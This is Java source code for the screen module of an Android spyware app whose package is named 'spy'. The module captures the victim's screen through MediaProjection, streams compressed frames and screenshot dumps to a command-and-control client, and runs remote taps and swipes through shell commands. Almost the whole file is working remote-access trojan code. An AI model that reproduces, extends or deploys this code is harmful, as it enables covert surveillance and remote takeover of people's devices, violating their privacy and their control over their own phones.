package ai.m4zk1play.spy;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.nio.ByteBuffer;

/** Mirroring layar via MediaProjection. */
public class ScreenModule {

    public static final int REQ_PROJECTION = 0x4d5c;

    private MediaProjection projection;
    private VirtualDisplay display;
    private ImageReader reader;
    private int width = 720;
    private int height = 1280;
    private int dpi = 320;
    private long last;
    private final Handler ui = new Handler(Looper.getMainLooper());
    private C2Client client;

    public void bind(C2Client c) {
        this.client = c;
    }

    public void request(Activity act) {
        MediaProjectionManager mpm = (MediaProjectionManager)
                act.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mpm != null) act.startActivityForResult(mpm.createScreenCaptureIntent(), REQ_PROJECTION);
    }

    public boolean ready() {
        return projection != null && reader != null;
    }

    public void start(Context ctx, Intent data, int resultCode) {
        if (data == null) return;
        MediaProjectionManager mpm = (MediaProjectionManager)
                ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mpm == null) return;

        stop();
        projection = mpm.getMediaProjection(resultCode, data);
        if (projection == null) return;

        projection.registerCallback(new MediaProjection.Callback() {
            @Override
            public void onStop() {
                stop();
            }
        }, ui);

        if (AgentService.instance != null) AgentService.instance.upgradeFg();

        DisplayMetrics dm = new DisplayMetrics();
        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        if (wm != null) wm.getDefaultDisplay().getMetrics(dm);
        width = Math.min(dm.widthPixels, 720);
        height = (int) ((float) dm.heightPixels / Math.max(1, dm.widthPixels) * width);
        dpi = dm.densityDpi;

        reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        display = projection.createVirtualDisplay("mzk", width, height, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, ui);

        reader.setOnImageAvailableListener(r -> {
            Image img = null;
            try {
                img = r.acquireLatestImage();
                if (img == null) return;
                long now = System.currentTimeMillis();
                if (now - last < 300) return;
                last = now;
                Bitmap bmp = grab(img);
                if (bmp != null && client != null) {
                    client.stream("screen", Modules.base64(Modules.jpeg(bmp, 55)), null);
                    bmp.recycle();
                }
            } catch (Exception ignored) {
            } finally {
                if (img != null) img.close();
            }
        }, ui);
    }

    private Bitmap grab(Image img) {
        try {
            ByteBuffer buf = img.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buf.remaining()];
            buf.get(bytes);
            Bitmap bmp = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(ByteBuffer.wrap(bytes));
            return bmp;
        } catch (Exception e) {
            return null;
        }
    }

    /** Tangkap satu frame lalu kirim sebagai dump. */
    public boolean shot(Context ctx) {
        if (reader == null) return false;
        Image img = null;
        try {
            img = reader.acquireLatestImage();
            if (img == null) return false;
            Bitmap bmp = grab(img);
            if (bmp == null) return false;
            if (client != null) {
                client.dump("screen", "screen_" + Modules.stamp() + ".jpg",
                        Modules.base64(Modules.jpeg(bmp, 88)));
            }
            bmp.recycle();
            return true;
        } catch (Exception e) {
            return false;
        } finally {
            if (img != null) img.close();
        }
    }

    public void tap(int x, int y) {
        Shell.exec("input tap " + x + " " + y);
    }

    public void swipe(int x1, int y1, int x2, int y2) {
        Shell.exec("input swipe " + x1 + " " + y1 + " " + x2 + " " + y2 + " 220");
    }

    public void stop() {
        try { if (display != null) display.release(); } catch (Exception ignored) { }
        try { if (reader != null) reader.close(); } catch (Exception ignored) { }
        try { if (projection != null) projection.stop(); } catch (Exception ignored) { }
        display = null;
        reader = null;
        projection = null;
    }
}
